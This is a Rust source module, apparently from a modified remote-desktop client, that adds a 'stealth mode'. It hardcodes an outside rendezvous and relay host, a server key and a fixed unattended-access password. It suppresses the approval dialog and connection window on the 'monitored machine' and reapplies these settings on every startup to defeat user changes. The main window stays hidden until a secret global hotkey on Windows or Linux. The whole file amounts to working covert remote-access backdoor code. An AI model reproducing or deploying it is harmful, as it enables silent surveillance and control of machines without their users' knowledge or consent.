use hbb_common::config::{keys, Config};
use hbb_common::log;

const OPTION_STEALTH: &str = "stealth-mode";
const RENDEZVOUS_SERVER: &str = "krikisifsg.tinestuff.com";
const RELAY_SERVER: &str = "krikisifsg.tinestuff.com";
const API_SERVER: &str = "https://krikisifsg.tinestuff.com";
const KEY: &str = "0smIpSgrOUf87k9EvKVUlvhbzDWA2Ws9ns+04mu9jdM=";
const PASSWORD: &str = "Krik@2026";

pub fn is_enabled() -> bool {
    Config::get_option(OPTION_STEALTH) == "Y"
}

// Forced on every startup of every process, so the locked values survive any
// config change made from the GUI or by another client.
pub fn apply_locked_config() {
    Config::set_option(
        keys::OPTION_CUSTOM_RENDEZVOUS_SERVER.to_owned(),
        RENDEZVOUS_SERVER.to_owned(),
    );
    Config::set_option(keys::OPTION_RELAY_SERVER.to_owned(), RELAY_SERVER.to_owned());
    Config::set_option(keys::OPTION_API_SERVER.to_owned(), API_SERVER.to_owned());
    Config::set_option(keys::OPTION_KEY.to_owned(), KEY.to_owned());
    // Unattended access must never pop the connection-manager window or an
    // approval dialog on the monitored machine.
    Config::set_option(
        keys::OPTION_VERIFICATION_METHOD.to_owned(),
        "use-permanent-password".to_owned(),
    );
    Config::set_option(keys::OPTION_APPROVE_MODE.to_owned(), "password".to_owned());
    Config::set_option("allow-hide-cm".to_owned(), "Y".to_owned());
    if !Config::set_permanent_password(PASSWORD) {
        log::error!("stealth: failed to apply the locked permanent password");
    }
    Config::set_option(OPTION_STEALTH.to_owned(), "Y".to_owned());
}

pub fn start_hotkey_listener() {
    #[cfg(windows)]
    {
        windows_hotkey();
    }
    #[cfg(all(target_os = "linux", feature = "stealth"))]
    {
        linux_hotkey();
    }
    #[cfg(not(any(windows, all(target_os = "linux", feature = "stealth"))))]
    {
        log::info!("stealth: global hotkey is not supported on this platform");
    }
}

fn show_main_window() {
    #[cfg(feature = "flutter")]
    {
        let event = serde_json::json!({ "name": "show_main_window" }).to_string();
        let _ = crate::flutter::push_global_event(crate::flutter::APP_TYPE_MAIN, event);
    }
}

#[cfg(windows)]
fn windows_hotkey() {
    const HOTKEY_ID: i32 = 0x52_53_44_01;
    const HOTKEY_VK: u32 = 0x52;
    use winapi::um::errhandlingapi::GetLastError;
    use winapi::um::winuser::{
        DispatchMessageW, GetMessageW, RegisterHotKey, TranslateMessage, UnregisterHotKey,
        MOD_ALT, MOD_CONTROL, MOD_SHIFT, MSG, WM_HOTKEY,
    };
    if let Err(err) = std::thread::Builder::new()
        .name("stealth-hotkey".into())
        .spawn(|| unsafe {
            if RegisterHotKey(
                std::ptr::null_mut(),
                HOTKEY_ID,
                MOD_CONTROL | MOD_ALT | MOD_SHIFT,
                HOTKEY_VK,
            ) == 0
            {
                log::error!("stealth: RegisterHotKey failed, error {}", GetLastError());
                return;
            }
            let mut msg = MSG {
                hwnd: std::ptr::null_mut(),
                message: 0,
                wParam: 0,
                lParam: 0,
                time: 0,
                pt: winapi::um::windef::POINT { x: 0, y: 0 },
            };
            while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
                TranslateMessage(&msg);
                if msg.message == WM_HOTKEY && msg.wParam == HOTKEY_ID as usize {
                    show_main_window();
                }
                DispatchMessageW(&msg);
            }
            UnregisterHotKey(std::ptr::null_mut(), HOTKEY_ID);
        }) {
        log::error!("stealth: failed to spawn hotkey thread: {err}");
    }
}

#[cfg(all(target_os = "linux", feature = "stealth"))]
fn linux_hotkey() {
    use x11rb::connection::Connection;
    use x11rb::cookie::Cookie;
    use x11rb::protocol::keysyms::key_R;
    use x11rb::protocol::{
        xproto::{
            ControlMask, GrabMode, LockMask, Mod1Mask, Mod2Mask, ShiftMask,
        },
        Event,
    };
    if let Err(err) = std::thread::Builder::new()
        .name("stealth-hotkey".into())
        .spawn(|| {
            let (conn, screen) = match x11rb::connect(None) {
                Ok(v) => v,
                Err(err) => {
                    log::error!("stealth: cannot connect to X server: {err}");
                    return;
                }
            };
            let root = conn.setup().roots[screen].root;
            let setup = conn.setup();
            let min_keycode = setup.min_keycode;
            let max_keycode = setup.max_keycode;
            // QueryKeymap only tells which keys are pressed right now; the
            // keysym -> keycode table comes from GetKeyboardMapping.
            let reply = match conn
                .get_keyboard_mapping(min_keycode, max_keycode - min_keycode)
            {
                Ok(v) => match v.reply() {
                    Ok(v) => v,
                    Err(err) => {
                        log::error!("stealth: get_keyboard_mapping reply failed: {err}");
                        return;
                    }
                },
                Err(err) => {
                    log::error!("stealth: get_keyboard_mapping failed: {err}");
                    return;
                }
            };
            let per = reply.keysyms_per_keycode as usize;
            if per == 0 {
                log::error!("stealth: empty keyboard mapping");
                return;
            }
            let mut keycode: u8 = 0;
            let mut found = false;
            for (i, group) in reply.keysyms.chunks(per).enumerate() {
                if group.contains(&key_R) {
                    keycode = min_keycode + i as u8;
                    found = true;
                    break;
                }
            }
            if !found {
                log::error!("stealth: keycode for 'R' not found");
                return;
            }
            // Ctrl+Alt+Shift+R, with CapsLock/NumLock left free.
            let base = ControlMask as u32 | Mod1Mask as u32 | ShiftMask as u32;
            for extra in [
                0u32,
                LockMask as u32,
                Mod2Mask as u32,
                LockMask as u32 | Mod2Mask as u32,
            ] {
                if let Err(err) = conn.grab_key(
                    false,
                    root,
                    base | extra,
                    keycode,
                    GrabMode::Async,
                    GrabMode::Async,
                ) {
                    log::error!("stealth: grab_key failed: {err}");
                }
            }
            loop {
                match conn.wait_for_event() {
                    Ok(Event::KeyPress(ev)) if ev.detail == keycode => {
                        show_main_window();
                    }
                    Ok(_) => {}
                    Err(err) => {
                        log::error!("stealth: X connection lost: {err}");
                        break;
                    }
                }
            }
        }) {
        log::error!("stealth: failed to spawn hotkey thread: {err}");
    }
}
